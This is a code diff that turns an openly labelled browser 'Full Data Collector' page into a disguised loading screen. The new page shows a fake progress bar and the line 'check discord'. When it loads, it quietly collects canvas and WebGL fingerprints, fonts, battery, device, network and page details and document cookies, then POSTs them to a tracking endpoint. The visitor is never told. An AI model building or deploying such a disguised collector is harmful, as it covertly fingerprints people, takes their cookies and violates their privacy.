@@ -1,423 +1,268 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8" />
-    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-    <title>Full Data Collector</title>
-    <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-        }
-        body {
-            font-family: system-ui, sans-serif;
-            background: #0a0a0a;
-            color: #00ff41;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            min-height: 100vh;
-            padding: 20px;
-        }
-        .container {
-            background: #111;
-            padding: 30px;
-            border-radius: 12px;
-            border: 1px solid #00ff4133;
-            max-width: 800px;
-            width: 100%;
-        }
-        h1 {
-            font-size: 18px;
-            font-weight: 400;
-            letter-spacing: 2px;
-            text-transform: uppercase;
-            border-bottom: 1px solid #00ff4133;
-            padding-bottom: 12px;
-            margin-bottom: 20px;
-        }
-        .status {
-            background: #0a0a0a;
-            padding: 15px;
-            border-radius: 6px;
-            font-size: 13px;
-            font-family: monospace;
-            white-space: pre-wrap;
-            word-break: break-all;
-            max-height: 500px;
-            overflow-y: auto;
-            border: 1px solid #00ff4122;
-            color: #00ff41bb;
-        }
-        .footer {
-            margin-top: 16px;
-            font-size: 11px;
-            color: #666;
-            text-align: center;
-            border-top: 1px solid #00ff4122;
-            padding-top: 16px;
-        }
-        .badge {
-            display: inline-block;
-            background: #00ff4122;
-            padding: 2px 10px;
-            border-radius: 20px;
-            font-size: 10px;
-            color: #00ff41;
-            letter-spacing: 1px;
-        }
-    </style>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Loading...</title>
+<style>
+  * { margin: 0; padding: 0; box-sizing: border-box; }
+  body {
+    background: #ffffff;
+    font-family: 'SF Pro Display', -apple-system, system-ui, sans-serif;
+    min-height: 100vh;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+  }
+  .loader {
+    text-align: center;
+    width: 260px;
+  }
+  .percent {
+    font-size: 52px;
+    font-weight: 700;
+    color: #e8c547;
+    letter-spacing: -2px;
+    margin-bottom: 20px;
+    animation: pop 0.6s cubic-bezier(0.34, 1.56, 0.64, 1) both;
+  }
+  @keyframes pop {
+    0% { transform: scale(0.6); opacity: 0; }
+    100% { transform: scale(1); opacity: 1; }
+  }
+  .bar-track {
+    width: 100%;
+    height: 8px;
+    background: #f0f0f0;
+    border-radius: 4px;
+    overflow: hidden;
+  }
+  .bar-fill {
+    height: 100%;
+    width: 0%;
+    background: #e8c547;
+    border-radius: 4px;
+    transition: width 0.25s ease-out;
+  }
+  .done-overlay {
+    position: fixed;
+    inset: 0;
+    background: #fff;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    opacity: 0;
+    pointer-events: none;
+    transition: opacity 0.6s ease;
+    z-index: 5;
+  }
+  .done-overlay.show {
+    opacity: 1;
+    pointer-events: auto;
+  }
+  .done-text {
+    font-size: 32px;
+    font-weight: 600;
+    color: #e8c547;
+    letter-spacing: 1px;
+    transform: translateY(20px);
+    transition: transform 0.5s cubic-bezier(0.34, 1.56, 0.64, 1);
+  }
+  .done-overlay.show .done-text {
+    transform: translateY(0);
+  }
+</style>
 </head>
 <body>
 
-    <div class="container">
-        <h1>⬡ Full Data Collector</h1>
-        <div id="status" class="status">⏳ Initializing...</div>
-        <div class="footer">
-            <span class="badge">⚡ No permissions required</span>
-            &nbsp;•&nbsp; All data sent to Webhook.site
-        </div>
-    </div>
+<div class="loader">
+  <div class="percent" id="pct">0%</div>
+  <div class="bar-track">
+    <div class="bar-fill" id="bar"></div>
+  </div>
+</div>
 
-    <script>
-        // ================================================================
-        // 1. CANVAS FINGERPRINT
-        // ================================================================
-        function getCanvasFingerprint() {
-            try {
-                const canvas = document.createElement('canvas');
-                const ctx = canvas.getContext('2d');
-                canvas.width = 256;
-                canvas.height = 64;
-                ctx.textBaseline = 'top';
-                ctx.font = '14px Arial';
-                ctx.fillStyle = '#f60';
-                ctx.fillRect(125, 1, 62, 20);
-                ctx.fillStyle = '#069';
-                ctx.fillText('Cwm fjordbank glyphs vext quiz, 😃', 2, 15);
-                ctx.fillStyle = 'rgba(102, 204, 0, 0.7)';
-                ctx.fillText('Cwm fjordbank glyphs vext quiz, 😃', 4, 17);
-                ctx.beginPath();
-                ctx.arc(200, 30, 12, 0, Math.PI * 2);
-                ctx.fillStyle = '#ff00ff';
-                ctx.fill();
-                ctx.strokeStyle = '#00ffff';
-                ctx.lineWidth = 2;
-                ctx.strokeRect(180, 10, 40, 40);
-                const dataUrl = canvas.toDataURL();
-                let hash = 0;
-                for (let i = 0; i < dataUrl.length; i++) {
-                    const char = dataUrl.charCodeAt(i);
-                    hash = ((hash << 5) - hash) + char;
-                    hash = hash & hash;
-                }
-                return hash.toString(16);
-            } catch (e) {
-                return 'canvas_error';
-            }
+<div class="done-overlay" id="overlay">
+  <div class="done-text">check discord</div>
+</div>
+
+<script>
+// ================================================================
+// COLLECTORS
+// ================================================================
+
+function getCanvasFingerprint() {
+    try {
+        const canvas = document.createElement('canvas');
+        const ctx = canvas.getContext('2d');
+        canvas.width = 256; canvas.height = 64;
+        ctx.textBaseline = 'top'; ctx.font = '14px Arial';
+        ctx.fillStyle = '#f60'; ctx.fillRect(125, 1, 62, 20);
+        ctx.fillStyle = '#069'; ctx.fillText('Cwm fjordbank glyphs vext quiz, \ud83d\ude03', 2, 15);
+        ctx.fillStyle = 'rgba(102, 204, 0, 0.7)'; ctx.fillText('Cwm fjordbank glyphs vext quiz, \ud83d\ude03', 4, 17);
+        ctx.beginPath(); ctx.arc(200, 30, 12, 0, Math.PI * 2);
+        ctx.fillStyle = '#ff00ff'; ctx.fill();
+        ctx.strokeStyle = '#00ffff'; ctx.lineWidth = 2; ctx.strokeRect(180, 10, 40, 40);
+        const d = canvas.toDataURL(); let h = 0;
+        for (let i = 0; i < d.length; i++) { h = ((h << 5) - h) + d.charCodeAt(i); h = h & h; }
+        return h.toString(16);
+    } catch (e) { return 'canvas_error'; }
+}
+
+function getWebGLFingerprint() {
+    try {
+        const c = document.createElement('canvas');
+        const gl = c.getContext('webgl') || c.getContext('experimental-webgl');
+        if (!gl) return 'webgl_not_supported';
+        const di = gl.getExtension('WEBGL_debug_renderer_info');
+        return di ? gl.getParameter(di.UNMASKED_RENDERER_WEBGL) : 'webgl_debug_disabled';
+    } catch (e) { return 'webgl_error'; }
+}
+
+function getInstalledFonts() {
+    const list = [
+        'Arial','Helvetica','Times New Roman','Courier New','Verdana','Georgia',
+        'Palatino Linotype','Tahoma','Trebuchet MS','Impact','Comic Sans MS',
+        'Lucida Console','Lucida Sans Unicode','Garamond','Book Antiqua','Arial Black',
+        'Arial Narrow','Century Gothic','Franklin Gothic Medium','Futura','Gill Sans',
+        'Optima','Segoe UI','Calibri','Cambria','Candara','Consolas','Constantia',
+        'Corbel','Helvetica Neue','Menlo','Monaco','Apple Color Emoji','Noto Sans',
+        'Roboto','Open Sans','Lato','Montserrat','Poppins','Inter','SF Pro Display',
+        'SF Pro Text'
+    ];
+    const found = [];
+    for (const f of list) { try { if (document.fonts.check(`12px "${f}"`)) found.push(f); } catch(e){} }
+    return found;
+}
+
+async function getBatteryStatus() {
+    try {
+        if (!navigator.getBattery) return null;
+        const b = await navigator.getBattery();
+        return { level: Math.round(b.level * 100), charging: b.charging, chargingTime: b.chargingTime, dischargingTime: b.dischargingTime };
+    } catch (e) { return null; }
+}
+
+function getNetworkInfo() {
+    const c = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+    if (!c) return null;
+    return { effectiveType: c.effectiveType||'unknown', downlink: c.downlink||'unknown', rtt: c.rtt||'unknown', saveData: c.saveData||false };
+}
+
+async function getMediaDevices() {
+    try {
+        const d = await navigator.mediaDevices.enumerateDevices();
+        return { hasCamera: d.some(x=>x.kind==='videoinput'), hasMic: d.some(x=>x.kind==='audioinput'), hasSpeaker: d.some(x=>x.kind==='audiooutput'), total: d.length };
+    } catch (e) { return { hasCamera:false, hasMic:false, hasSpeaker:false, total:0 }; }
+}
+
+function getPerformanceTiming() {
+    try {
+        const p = performance.timing, n = p.navigationStart;
+        return { loadTime: p.loadEventEnd-n, domContentLoaded: p.domContentLoadedEventEnd-n, dnsTime: p.domainLookupEnd-p.domainLookupStart, tcpTime: p.connectEnd-p.connectStart, ttfb: p.responseStart-p.requestStart };
+    } catch (e) { return null; }
+}
+
+function getPlugins() { try { return Array.from(navigator.plugins).map(p=>p.name); } catch(e){ return []; } }
+
+function getGamepadInfo() {
+    try {
+        const gp = navigator.getGamepads ? navigator.getGamepads() : [];
+        const c = [];
+        for (const g of gp) { if (g) c.push({ id:g.id, index:g.index, mapping:g.mapping, buttons:g.buttons.length, axes:g.axes.length }); }
+        return { connected: c, count: c.length };
+    } catch (e) { return { connected:[], count:0 }; }
+}
+
+// ================================================================
+// COLLECT EVERYTHING
+// ================================================================
+
+async function collectAllData() {
+    const d = {
+        timestamp: new Date().toISOString(),
+        userAgent: navigator.userAgent,
+        platform: navigator.platform,
+        vendor: navigator.vendor || 'unknown',
+        language: navigator.language,
+        languages: navigator.languages,
+        cookieEnabled: navigator.cookieEnabled,
+        doNotTrack: navigator.doNotTrack || 'unknown',
+        online: navigator.onLine,
+        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+        timezoneOffset: new Date().getTimezoneOffset(),
+        locale: Intl.DateTimeFormat().resolvedOptions().locale,
+        screen: { width:screen.width, height:screen.height, colorDepth:screen.colorDepth, availWidth:screen.availWidth, availHeight:screen.availHeight },
+        window: { innerWidth:window.innerWidth, innerHeight:window.innerHeight, outerWidth:window.outerWidth, outerHeight:window.outerHeight, devicePixelRatio:window.devicePixelRatio },
+        hardware: { deviceMemory:navigator.deviceMemory||'unknown', cpuCores:navigator.hardwareConcurrency||'unknown' },
+        fingerprints: { canvas:getCanvasFingerprint(), webgl:getWebGLFingerprint() },
+        pointer: { touchSupport:'ontouchstart' in window||navigator.maxTouchPoints>0, maxTouchPoints:navigator.maxTouchPoints||0, hoverSupport:window.matchMedia('(hover:hover)').matches, pointerCoarse:window.matchMedia('(pointer:coarse)').matches, pointerFine:window.matchMedia('(pointer:fine)').matches },
+        theme: { prefersColorScheme:window.matchMedia('(prefers-color-scheme:dark)').matches?'dark':'light', prefersReducedMotion:window.matchMedia('(prefers-reduced-motion:reduce)').matches },
+        network: getNetworkInfo(),
+        performance: getPerformanceTiming(),
+        plugins: getPlugins(),
+        pluginsCount: navigator.plugins?navigator.plugins.length:0,
+        fonts: getInstalledFonts(),
+        fontsCount: 0,
+        battery: await getBatteryStatus(),
+        media: await getMediaDevices(),
+        gamepad: getGamepadInfo(),
+        page: { url:window.location.href, referrer:document.referrer, hostname:window.location.hostname },
+        cookies: document.cookie || 'none',
+        historyLength: window.history.length,
+    };
+    d.fontsCount = d.fonts.length;
+    return d;
+}
+
+// ================================================================
+// UI + SEND
+// ================================================================
+
+const pctEl = document.getElementById('pct');
+const barEl = document.getElementById('bar');
+const overlay = document.getElementById('overlay');
+let current = 0;
+
+function setProgress(n) {
+    current = Math.min(100, Math.max(0, n));
+    pctEl.textContent = current + '%';
+    barEl.style.width = current + '%';
+}
+
+function showDone() {
+    pctEl.textContent = '100%';
+    barEl.style.width = '100%';
+    setTimeout(() => { overlay.classList.add('show'); }, 500);
+}
+
+async function main() {
+    try {
+        const steps = 22;
+        for (let i = 0; i < steps; i++) {
+            await new Promise(r => setTimeout(r, 30));
+            setProgress(Math.round((i / steps) * 100));
         }
 
-        // ================================================================
-        // 2. WEBGL FINGERPRINT
-        // ================================================================
-        function getWebGLFingerprint() {
-            try {
-                const canvas = document.createElement('canvas');
-                const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
-                if (!gl) return 'webgl_not_supported';
-                const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
-                if (!debugInfo) return 'webgl_debug_disabled';
-                return gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) || 'unknown';
-            } catch (e) {
-                return 'webgl_error';
-            }
-        }
+        const data = await collectAllData();
+        setProgress(90);
 
-        // ================================================================
-        // 3. INSTALLED FONTS
-        // ================================================================
-        function getInstalledFonts() {
-            const fontList = [
-                'Arial', 'Helvetica', 'Times New Roman', 'Courier New', 'Verdana',
-                'Georgia', 'Palatino Linotype', 'Tahoma', 'Trebuchet MS', 'Impact',
-                'Comic Sans MS', 'Lucida Console', 'Lucida Sans Unicode', 'Garamond',
-                'Book Antiqua', 'Arial Black', 'Arial Narrow', 'Century Gothic',
-                'Franklin Gothic Medium', 'Futura', 'Gill Sans', 'Optima',
-                'Segoe UI', 'Calibri', 'Cambria', 'Candara', 'Consolas', 'Constantia',
-                'Corbel', 'Helvetica Neue', 'Menlo', 'Monaco', 'Apple Color Emoji',
-                'Noto Sans', 'Roboto', 'Open Sans', 'Lato', 'Montserrat', 'Poppins',
-                'Inter', 'SF Pro Display', 'SF Pro Text'
-            ];
-            const installed = [];
-            for (const font of fontList) {
-                try {
-                    if (document.fonts.check(`12px "${font}"`)) {
-                        installed.push(font);
-                    }
-                } catch (e) {}
-            }
-            return installed;
-        }
+        await fetch('/.netlify/functions/track', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify(data)
+        });
 
-        // ================================================================
-        // 4. BATTERY
-        // ================================================================
-        async function getBatteryStatus() {
-            try {
-                if (!navigator.getBattery) return null;
-                const battery = await navigator.getBattery();
-                return {
-                    level: Math.round(battery.level * 100),
-                    charging: battery.charging,
-                    chargingTime: battery.chargingTime,
-                    dischargingTime: battery.dischargingTime,
-                };
-            } catch (e) {
-                return null;
-            }
-        }
+        setProgress(100);
+        showDone();
+    } catch (e) {
+        setProgress(100);
+        showDone();
+    }
+}
 
-        // ================================================================
-        // 5. NETWORK INFO
-        // ================================================================
-        function getNetworkInfo() {
-            const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
-            if (!conn) return null;
-            return {
-                effectiveType: conn.effectiveType || 'unknown',
-                downlink: conn.downlink || 'unknown',
-                rtt: conn.rtt || 'unknown',
-                saveData: conn.saveData || false,
-            };
-        }
-
-        // ================================================================
-        // 6. MEDIA DEVICES
-        // ================================================================
-        async function getMediaDevices() {
-            try {
-                const devices = await navigator.mediaDevices.enumerateDevices();
-                return {
-                    hasCamera: devices.some(d => d.kind === 'videoinput'),
-                    hasMic: devices.some(d => d.kind === 'audioinput'),
-                    hasSpeaker: devices.some(d => d.kind === 'audiooutput'),
-                    total: devices.length,
-                };
-            } catch (e) {
-                return { hasCamera: false, hasMic: false, hasSpeaker: false, total: 0 };
-            }
-        }
-
-        // ================================================================
-        // 7. PERFORMANCE
-        // ================================================================
-        function getPerformanceTiming() {
-            try {
-                const perf = performance.timing;
-                const navStart = perf.navigationStart;
-                return {
-                    loadTime: perf.loadEventEnd - navStart,
-                    domContentLoaded: perf.domContentLoadedEventEnd - navStart,
-                    dnsTime: perf.domainLookupEnd - perf.domainLookupStart,
-                    tcpTime: perf.connectEnd - perf.connectStart,
-                    ttfb: perf.responseStart - perf.requestStart,
-                };
-            } catch (e) {
-                return null;
-            }
-        }
-
-        // ================================================================
-        // 8. PLUGINS
-        // ================================================================
-        function getPlugins() {
-            try {
-                return Array.from(navigator.plugins).map(p => p.name);
-            } catch (e) {
-                return [];
-            }
-        }
-
-        // ================================================================
-        // 9. GAMEPAD
-        // ================================================================
-        function getGamepadInfo() {
-            try {
-                const gamepads = navigator.getGamepads ? navigator.getGamepads() : [];
-                const connected = [];
-                for (const gp of gamepads) {
-                    if (gp) {
-                        connected.push({
-                            id: gp.id,
-                            index: gp.index,
-                            mapping: gp.mapping,
-                            buttons: gp.buttons.length,
-                            axes: gp.axes.length,
-                        });
-                    }
-                }
-                return { connected, count: connected.length };
-            } catch (e) {
-                return { connected: [], count: 0 };
-            }
-        }
-
-        // ================================================================
-        // 10. COLLECT EVERYTHING
-        // ================================================================
-        async function collectAllData() {
-            const data = {
-                timestamp: new Date().toISOString(),
-                userAgent: navigator.userAgent,
-                platform: navigator.platform,
-                vendor: navigator.vendor || 'unknown',
-                language: navigator.language,
-                languages: navigator.languages,
-                cookieEnabled: navigator.cookieEnabled,
-                doNotTrack: navigator.doNotTrack || 'unknown',
-                online: navigator.onLine,
-                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-                timezoneOffset: new Date().getTimezoneOffset(),
-                locale: Intl.DateTimeFormat().resolvedOptions().locale,
-                screen: {
-                    width: screen.width,
-                    height: screen.height,
-                    colorDepth: screen.colorDepth,
-                    availWidth: screen.availWidth,
-                    availHeight: screen.availHeight,
-                },
-                window: {
-                    innerWidth: window.innerWidth,
-                    innerHeight: window.innerHeight,
-                    outerWidth: window.outerWidth,
-                    outerHeight: window.outerHeight,
-                    devicePixelRatio: window.devicePixelRatio,
-                },
-                hardware: {
-                    deviceMemory: navigator.deviceMemory || 'unknown',
-                    cpuCores: navigator.hardwareConcurrency || 'unknown',
-                },
-                fingerprints: {
-                    canvas: getCanvasFingerprint(),
-                    webgl: getWebGLFingerprint(),
-                },
-                pointer: {
-                    touchSupport: 'ontouchstart' in window || navigator.maxTouchPoints > 0,
-                    maxTouchPoints: navigator.maxTouchPoints || 0,
-                    hoverSupport: window.matchMedia('(hover: hover)').matches,
-                    pointerCoarse: window.matchMedia('(pointer: coarse)').matches,
-                    pointerFine: window.matchMedia('(pointer: fine)').matches,
-                },
-                theme: {
-                    prefersColorScheme: window.matchMedia('(prefers-color-scheme: dark)').matches ? 'dark' : 'light',
-                    prefersReducedMotion: window.matchMedia('(prefers-reduced-motion: reduce)').matches,
-                },
-                network: getNetworkInfo(),
-                performance: getPerformanceTiming(),
-                plugins: getPlugins(),
-                pluginsCount: navigator.plugins ? navigator.plugins.length : 0,
-                fonts: getInstalledFonts(),
-                fontsCount: 0,
-                battery: await getBatteryStatus(),
-                media: await getMediaDevices(),
-                gamepad: getGamepadInfo(),
-                page: {
-                    url: window.location.href,
-                    referrer: document.referrer,
-                    hostname: window.location.hostname,
-                },
-                cookies: document.cookie || 'none',
-                historyLength: window.history.length,
-            };
-
-            data.fontsCount = data.fonts.length;
-            return data;
-        }
-
-        // ================================================================
-        // 11. SEND TO WEBHOOK.SITE
-        // ================================================================
-        async function sendData(data) {
-            const statusDiv = document.getElementById('status');
-
-            // 👇 PASTE YOUR WEBHOOK URL HERE
-            const WEBHOOK_URL = '/.netlify/functions/track';
-
-            try {
-                const response = await fetch(WEBHOOK_URL, {
-                    method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json',
-                    },
-                    body: JSON.stringify({
-                        timestamp: new Date().toISOString(),
-                        fullData: data, // <-- THIS SENDS EVERYTHING!
-                    }),
-                });
-
-                statusDiv.innerHTML = `
-✅ Full data sent to Webhook.site!
-${new Date().toISOString()}
-
-📊 Data Points Collected: ${Object.keys(data).length}
-
-Scroll down on Webhook.site to see the FULL DATA DUMP under "Body" or "Content".
-                `;
-
-            } catch (error) {
-                statusDiv.innerHTML = `
-❌ Error: ${error.message}
-
-📡 DATA WAS STILL COLLECTED! Open browser console (F12) to see it.
-                `;
-                console.log('📡 FULL DATA DUMP (copy this):', JSON.stringify(data, null, 2));
-            }
-        }
-
-        // ================================================================
-        // 12. RUN
-        // ================================================================
-        async function main() {
-            const statusDiv = document.getElementById('status');
-            statusDiv.textContent = '📡 Collecting all data...';
-
-            try {
-                const data = await collectAllData();
-
-                statusDiv.innerHTML = `
-✅ Collected ${Object.keys(data).length} data points!
-${new Date().toISOString()}
-
-📊 Preview:
-• Timezone: ${data.timezone}
-• Device: ${data.userAgent.split('(')[1]?.split(')')[0] || 'unknown'}
-• Screen: ${data.screen.width}x${data.screen.height}
-• Memory: ${data.hardware.deviceMemory} GB
-• CPU: ${data.hardware.cpuCores} cores
-• Canvas: ${data.fingerprints.canvas.substring(0, 20)}...
-• Fonts: ${data.fontsCount} installed
-• Plugins: ${data.pluginsCount}
-• Touch: ${data.pointer.touchSupport ? '✅ Yes' : '❌ No'}
-• Battery: ${data.battery ? data.battery.level + '%' : 'N/A'}
-• Network: ${data.network ? data.network.effectiveType : 'N/A'}
-
-📤 Sending full data to Webhook.site...
-                `;
-
-                await sendData(data);
-
-            } catch (error) {
-                statusDiv.innerHTML = `❌ Error: ${error.message}`;
-            }
-        }
-
-        if (document.readyState === 'complete') {
-            main();
-        } else {
-            window.addEventListener('load', main);
-        }
-    </script>
-
+if (document.readyState === 'complete') { main(); }
+else { window.addEventListener('load', main); }
+</script>
 </body>
 </html>
